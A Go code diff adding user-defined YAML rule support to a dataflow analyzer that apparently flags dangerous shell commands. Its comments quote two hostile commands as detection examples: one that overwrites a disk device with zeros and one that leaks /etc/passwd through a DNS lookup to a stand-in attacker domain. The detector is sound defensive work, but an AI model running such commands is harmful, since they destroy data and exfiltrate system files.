@@ -10,11 +10,18 @@ import (
 // (zero source → device sink).
 //
 // Depends on ctx.Parsed from the structural analyzer (Layer 1).
-type DataflowAnalyzer struct{}
+type DataflowAnalyzer struct {
+	userRules []DataflowRule // user-defined YAML dataflow rules
+}
 
 // NewDataflowAnalyzer creates a dataflow analyzer.
 func NewDataflowAnalyzer() *DataflowAnalyzer {
 	return &DataflowAnalyzer{}
+}
+
+// SetUserRules attaches user-defined dataflow rules from YAML packs.
+func (d *DataflowAnalyzer) SetUserRules(rules []DataflowRule) {
+	d.userRules = rules
 }
 
 func (d *DataflowAnalyzer) Name() string { return "dataflow" }
@@ -28,6 +35,7 @@ func (d *DataflowAnalyzer) Analyze(ctx *AnalysisContext) []Finding {
 
 	var findings []Finding
 
+	// 1. Run built-in Go checks
 	// Check redirect-based flows (e.g., cat /dev/zero > /dev/sda)
 	findings = append(findings, d.checkRedirectFlows(ctx)...)
 
@@ -36,6 +44,24 @@ func (d *DataflowAnalyzer) Analyze(ctx *AnalysisContext) []Finding {
 
 	// Check command substitution exfiltration (e.g., dig $(cat /etc/passwd).evil.com)
 	findings = append(findings, d.checkSubstitutionExfil(ctx)...)
+
+	// 2. Run user-defined YAML dataflow rules
+	for _, rule := range d.userRules {
+		if MatchDataflowRule(ctx.Parsed, rule) {
+			f := Finding{
+				AnalyzerName: "dataflow",
+				RuleID:       rule.ID,
+				Decision:     rule.Decision,
+				Confidence:   rule.Confidence,
+				Reason:       rule.Reason,
+				TaxonomyRef:  rule.Taxonomy,
+			}
+			if f.Confidence == 0 {
+				f.Confidence = 0.85
+			}
+			findings = append(findings, f)
+		}
+	}
 
 	return findings
 }
